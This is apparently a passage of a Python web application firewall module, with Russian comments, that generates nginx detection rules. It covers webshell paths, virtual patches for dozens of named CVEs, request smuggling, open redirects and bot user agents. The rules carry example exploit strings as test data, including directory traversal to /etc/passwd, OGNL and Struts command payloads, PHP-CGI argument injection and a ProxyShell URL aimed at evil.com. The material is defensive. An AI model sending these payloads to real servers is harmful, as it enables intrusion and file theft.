      r"symlink|bypass|gel4y|tinyfilemanager)\.(?:php\d?|phtml|pht|asp|aspx|ashx|jsp|jspx|cgi)(?:$|\?)",
      ex=("/wp-content/uploads/wso.php", "/alfa.php", "/shell.php?cmd=id")),
    R("shell-params", "webshells", "Передача команд скрипту",
      r"\.(?:php\d?|phtml|asp|aspx|jsp|cgi|pl)\?(?:cmd|exec|command|shell|execute|ping|query|run)=",
      ex=("/images/x.php?cmd=whoami",)),
    # ------------------------------------------------------------------ виртуальные патчи
    R("cve-apache-traversal", "cve", "Apache: обход каталогов", r"/(?:cgi-bin|icons)/(?:[^?]*?)(?:\.%2e|%2e\.|%2e%2e|"
      r"%%32%65|%2%65|%%32e|\.%%32%65)", cve="CVE-2021-41773, CVE-2021-42013",
      ex=("/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", "/icons/.%%32%65/.%%32%65/etc/passwd")),
    R("cve-confluence", "cve", "Confluence: OGNL в URL и настройка", rf"{DOL}{LB}{LP}(?:#|%23)|"
      r"setupcomplete=false|/server-info\.action\?bootstrapstatusprovider|\\u0027|%5cu0027",
      cve="CVE-2022-26134, CVE-2023-22515, CVE-2021-26084",
      ex=("/%24%7B%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29%29%7D/",
          "/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false")),
    R("cve-citrix", "cve", "Citrix ADC / NetScaler: обход каталогов", r"/vpns?/(?:\.\.|%2e%2e)/|/vpn/\.\./vpns/",
      cve="CVE-2019-19781", ex=("/vpn/../vpns/cfg/smb.conf",)),
    R("cve-semicolon", "cve", "Обход через ..; (F5, Tomcat, Spring)", r"\.\.;/|%2e%2e;/|\.\.%3b/|;\.\./",
      cve="CVE-2020-5902", ex=("/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp",)),
    R("cve-f5-icontrol", "cve", "F5 iControl REST", r"/mgmt/tm/util/bash|/mgmt/shared/authn/login",
      cve="CVE-2022-1388", ex=("/mgmt/tm/util/bash",)),
    R("cve-fortinet", "cve", "Fortinet: чтение файлов SSL VPN", r"/remote/fgt_lang\?lang=/\.\.|/remote/login/\.\./",
      cve="CVE-2018-13379", ex=("/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",)),
    R("cve-proxyshell", "cve", "Exchange ProxyShell / ProxyNotShell",
      r"/autodiscover/autodiscover\.json\?@|/autodiscover/autodiscover\.json[^\s]*?(?:powershell|/mapi/)",
      cve="CVE-2021-34473, CVE-2022-41040",
      ex=("/autodiscover/autodiscover.json?@evil.com/owa/?&Email=autodiscover/autodiscover.json%3F@evil.com",)),
    R("cve-php-cgi", "cve", "PHP-CGI: внедрение аргументов", r"\?(?:-|%ad|%2d)[dsnc](?:\+|%20|$)|%ad(?:d|%64)(?:\+|%20)",
      cve="CVE-2024-4577, CVE-2012-1823",
      ex=("/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "/index.php?-s")),
    R("cve-phpunit", "cve", "PHPUnit eval-stdin.php", r"eval-stdin\.php", cve="CVE-2017-9841",
      ex=("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",)),
    R("cve-drupal", "cve", "Drupalgeddon2", r"(?:#|%23)(?:post_render|pre_render|lazy_builder|access_callback|markup)"
      r"|element_parents=account/mail", cve="CVE-2018-7600",
      ex=("/user/register?element_parents=account/mail/%23value&ajax_form=1",)),
    R("cve-thinkphp", "cve", "ThinkPHP: вызов функций", r"invokefunction|think(?:\\|%5c)(?:app|container|request)|"
      r"\?s=/?index/(?:\\|%5c)think", ex=("/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array",),
      cve="CVE-2018-20062"),
    R("cve-gpon", "cve", "Роутеры GPON", r"/gponform/diag_form|/boaform/admin/formlogin|/hnap1/", cve="CVE-2018-10561",
      ex=("/GponForm/diag_Form?images/",)),
    R("cve-joomla", "cve", "Joomla: раскрытие конфигурации", r"/api/index\.php/v1/(?:config/application|users)\?public=true",
      cve="CVE-2023-23752", ex=("/api/index.php/v1/config/application?public=true",)),
    R("cve-moveit", "cve", "MOVEit Transfer", r"/moveitisapi/moveitisapi\.dll|/guestaccess\.aspx\?.*arg06|/human2?\.aspx",
      cve="CVE-2023-34362", ex=("/moveitisapi/moveitisapi.dll?action=m2",)),
    R("cve-ivanti", "cve", "Ivanti Connect Secure и EPMM",
      r"/api/v1/totp/user-backup-code/\.\./|/api/v1/(?:license/keys-status|cav/client/status)/[^?]*(?:%3b|;)|"
      r"/mifs/aad/api/v2/|/dana-na/[^?]*\.\./", cve="CVE-2023-46805, CVE-2024-21887, CVE-2023-35078",
      ex=("/api/v1/totp/user-backup-code/../../license/keys-status/%3bid",)),
    R("cve-screenconnect", "cve", "ConnectWise ScreenConnect", r"/setupwizard\.aspx/", cve="CVE-2024-1709",
      ex=("/SetupWizard.aspx/abc",)),
    R("cve-panos", "cve", "Palo Alto GlobalProtect: путь в cookie", r"sessid=(?:[^;]*?)(?:\.\./|%2e%2e)",
      t=("cookie",), cve="CVE-2024-3400", ex=("SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/x",)),
    R("cve-checkpoint", "cve", "Check Point: чтение файлов", r"/clients/mycrl|acshell/\.\./", cve="CVE-2024-24919",
      ex=("/clients/MyCRL",)),
    R("cve-nextjs", "cve", "Next.js: обход middleware", r".+", t=("nextmw",), cve="CVE-2025-29927",
      ex=("middleware:middleware:middleware:middleware:middleware",),
      note="Заголовок X-Middleware-Subrequest от клиента; дополнительно его вырезает «Удалять опасные заголовки»"),
    R("cve-teamcity", "cve", "JetBrains TeamCity", r"\?jsp=/app/rest/|/app/rest/users/[^?]*;\.jsp|/hax\?jsp=",
      cve="CVE-2024-27198", ex=("/hax?jsp=/app/rest/users;.jsp",)),
    R("cve-tomcat-put", "cve", "Tomcat: загрузка JSP через PUT", r"\.jsp(?:/|%20|::\$data)(?:$|\?)",
      cve="CVE-2017-12615", ex=("/shell.jsp/",)),
    R("cve-vcenter", "cve", "VMware vCenter", r"/ui/vropspluginui/rest/services/|/analytics/telemetry/ph/api/hyper/send",
      cve="CVE-2021-21972, CVE-2021-21985", ex=("/ui/vropspluginui/rest/services/uploadova",)),
    R("cve-spring-gateway", "cve", "Spring Cloud Gateway", r"/actuator/gateway/(?:routes|refresh)", cve="CVE-2022-22947",
      ex=("/actuator/gateway/routes/hacktest",)),
    R("cve-papercut", "cve", "PaperCut", r"/app\?service=page/setupcompleted", cve="CVE-2023-27350",
      ex=("/app?service=page/SetupCompleted",)),
    R("cve-sap", "cve", "SAP NetWeaver Visual Composer", r"/developmentserver/metadatauploader", cve="CVE-2025-31324",
      ex=("/developmentserver/metadatauploader?CONTENTTYPE=MODEL",)),
    R("cve-sharepoint", "cve", "SharePoint ToolShell", r"/_layouts/1[56]/toolpane\.aspx", cve="CVE-2025-53770",
      ex=("/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx",)),
    R("cve-crushftp", "cve", "CrushFTP: шаблоны сервера", r"\{working_dir\}|%7bworking_dir%7d|<inc>|%3cinc%3e",
      cve="CVE-2024-4040", ex=("/WebInterface/function/?command=zip&path={working_dir}",)),
    R("cve-struts-ctype", "cve", "Struts2 Jakarta (Content-Type)", r"%\{|\$\{|#_memberaccess|ognl", t=("ctype",),
      cve="CVE-2017-5638", ex=("%{(#_='multipart/form-data').(#cmd='id')}",)),
    # ------------------------------------------------------------------ протокол
    R("proto-method", "protocol", "Нестандартный метод",
      r"^(?!(?:GET|HEAD|POST|PUT|PATCH|DELETE|OPTIONS)$)", t=("method",), flags="~",
      ex=("TRACE", "TRACK", "PROPFIND", "DEBUG"),
      note="WebDAV и нестандартные API потребуют исключения для сайта"),
    R("proto-null", "protocol", "Нулевой байт", r"%00|\\x00|\\u0000", ex=("/index.php?file=../config.php%00.jpg",)),
    R("proto-overlong", "protocol", "«Длинная» UTF-8 и %u-кодировка", r"%c0%a[ef]|%c1%9c|%c1%1c|%e0%80%af|%f0%80%80%af|"
      r"%u00(?:2e|2f|5c|3c|3e|27)", ex=("/%c0%ae%c0%ae/etc/passwd", "/?q=%u003cscript")),
    R("proto-double-enc", "protocol", "Двойная кодировка служебных символов", r"%25(?:2e|2f|5c|3c|3e|27|22|00|0d|0a)",
      ex=("/%252e%252e%252fetc%252fpasswd",)),
    R("proto-te10", "protocol", "Transfer-Encoding в HTTP/1.0", r"^HTTP/1\.0\|.+", t=("te",), flags="~",
      ex=("HTTP/1.0|chunked",)),
    R("proto-te-obf", "protocol", "Нестандартный Transfer-Encoding (контрабанда запросов)",
      r"^HTTP/[\d.]+\|(?!chunked$).+", t=("te",), flags="~*", ex=("HTTP/1.1|chunked, identity", "HTTP/1.1|xchunked")),
    R("proto-method-override", "protocol", "Подмена метода заголовком", r".+", t=("xmo",), lvl=2,
      ex=("DELETE",)),
    R("proto-long-uri", "protocol", "Очень длинный URL (больше 4000 символов)", r"^.{4000,}", lvl=2, flags="~",
      ex=("/" + "a" * 4001,)),
    # ------------------------------------------------------------------ открытые перенаправления
    R("redirect-param", "redirect", "Ссылка на другой сайт в параметре перенаправления",
      rf"[?&](?:redirect(?:_?ur[il])?|url|next|return(?:_?to|url)?|goto|dest(?:ination)?|continue|redir|"
      rf"forward|target|out|view|to|r|u){EQ}(?:(?:https?|ftp){COL})?(?:{SL}|{BS}){{2}}",
      ex=("/login?next=//evil.example", "/out?url=https://evil.example/")),
    # ------------------------------------------------------------------ боты
    R("bots-ai", "bots_ai", "Боты ИИ", r"gptbot|chatgpt-user|oai-searchbot|claudebot|claude-web|claude-user|"
      r"claude-searchbot|anthropic-ai|ccbot|bytespider|perplexitybot|perplexity-user|amazonbot|"
      r"meta-externalagent|meta-externalfetcher|facebookbot|diffbot|cohere-ai|cohere-training|omgili|"
      r"imagesiftbot|timpibot|youbot|ai2bot|kangaroo bot|petalbot|duckassistbot|mistralai-user|"
      r"google-cloudvertexbot|applebot-extended|iaskspider|novaact|panscient|webzio|velenpublicwebcrawler",
      t=("ua",), ex=("Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)",
                     "Mozilla/5.0 (compatible; ClaudeBot/1.0; +claudebot@anthropic.com)")),
    R("bots-seo", "bots_seo", "SEO-боты", r"ahrefsbot|semrushbot|mj12bot|dotbot|blexbot|dataforseobot|barkrowler|"
      r"serpstatbot|megaindex|seokicks|linkdexbot|sistrix|rogerbot|screaming frog|seznam-?bot/\d+.*?seo|"
      r"zoominfobot|backlinkcrawler|siteauditbot|seobilitybot|linkfluence|awario|brandverity",
      t=("ua",), ex=("Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",)),
    R("bots-libs", "bots_libs", "HTTP-библиотеки и автоматизация",
      r"python-requests|python-urllib|python-httpx|aiohttp|go-http-client|^curl/|^wget/|libwww-perl|"
      r"^java/|okhttp|apache-httpclient|node-fetch|axios/|undici|scrapy|headlesschrome|phantomjs|"
      r"selenium|puppeteer|playwright|httpclient|guzzlehttp|ruby|^php/|winhttp|libcurl|httpie|"
      r"mechanize|colly|^rust-reqwest|^reqwest",
      t=("ua",), ex=("python-requests/2.31.0", "curl/8.4.0", "Go-http-client/1.1",
                     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0")),
]

RULE_BY_ID: Dict[str, Rule] = {r.id: r for r in RULES}

# Безобидные запросы: правила уровня 1 не должны их задевать (проверяется автотестом)
BENIGN_URIS = [
    "/", "/index.html", "/search?q=nginx+reverse+proxy", "/catalog/shoes?size=42&color=red&sort=price_asc",
    "/blog/2024/05/how-to-select-the-best-union-plan", "/?q=O%27Reilly+books", "/api/v1/users/42/orders?page=2",
    "/static/js/app.3f2a1c.js", "/images/logo.svg", "/login?next=/account", "/cart/add?item=123&qty=2",
    "/wp-admin/admin-ajax.php?action=heartbeat", "/wp-json/wp/v2/posts?per_page=10", "/feed/", "/sitemap.xml",
    "/robots.txt", "/favicon.ico", "/.well-known/acme-challenge/abcDEF123", "/.well-known/security.txt",
    "/products/cat-food-for-dogs", "/?utm_source=google&utm_medium=cpc&gclid=abc", "/download/report-2024.pdf",
    "/docs/select-and-update-statements", "/news?tag=dog|cat", "/files/backup-guide.html", "/api/search?q=a%20or%20b",
    "/forum/topic?id=10&title=I%27m+new+here", "/oauth/callback?code=abc&state=xyz",
    "/redirect?to=/profile", "/script-tutorial", "/en/onload-events-explained", "/user/settings/profile",
    "/api/graphql?query=%7Bviewer%7Blogin%7D%7D", "/shop?price%5Bmin%5D=10&price%5Bmax%5D=100",
    "/?s=drop+shipping", "/assets/fonts/inter.woff2", "/video/stream.m3u8", "/cgi/info", "/console-games",
    "/actuator-parts", "/team/1/members", "/path/with.dots/file.name.txt", "/a/b.c/d..e",
]
BENIGN_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
]


def nginx_quote(pattern: str) -> str:
    """Шаблон → строка в двойных кавычках для конфигурации nginx (парсер nginx снимает \\\\ и \\")."""
    if re.search(r"(?<!\\)\\[nrt]", pattern):
        raise ValueError(f"шаблон содержит \\n, \\r или \\t — nginx превратит их в управляющие символы: {pattern}")
    pattern = pattern.replace('\\"', '"')  # в PCRE \" — та же кавычка
    return '"' + pattern.replace("\\\\", "\\\\\\\\").replace('"', '\\"') + '"'


def rules_for(level: int, disabled: List[str]) -> List[Rule]:
    off = set(disabled or [])
    return [r for r in RULES if r.level <= level and r.id not in off]


def map_name(cat: str, target: str) -> str:
    return f"$nm_w_{cat}_{target}"


def maps(level: int, disabled: List[str]) -> Dict[Tuple[str, str], List[Rule]]:
    """(категория, поле) → правила; для каждой пары строится своя карта nginx."""
    out: Dict[Tuple[str, str], List[Rule]] = {}
    for r in rules_for(level, disabled):
        for t in r.targets:
            out.setdefault((r.cat, t), []).append(r)
    return out


def match(rule: Rule, value: str) -> bool:
    return bool(rule.compiled().search(value))


def scan(values: Dict[str, str], level: int = 2, disabled: List[str] = ()) -> List[Rule]:
    """Проверка значений полей в Python (для самопроверки и тестов): какие правила сработали бы."""
    hits = []
    for r in rules_for(level, list(disabled)):
        for t in r.targets:
            v = values.get(t)
            if v is not None and match(r, v):
                hits.append(r)
                break
    return hits
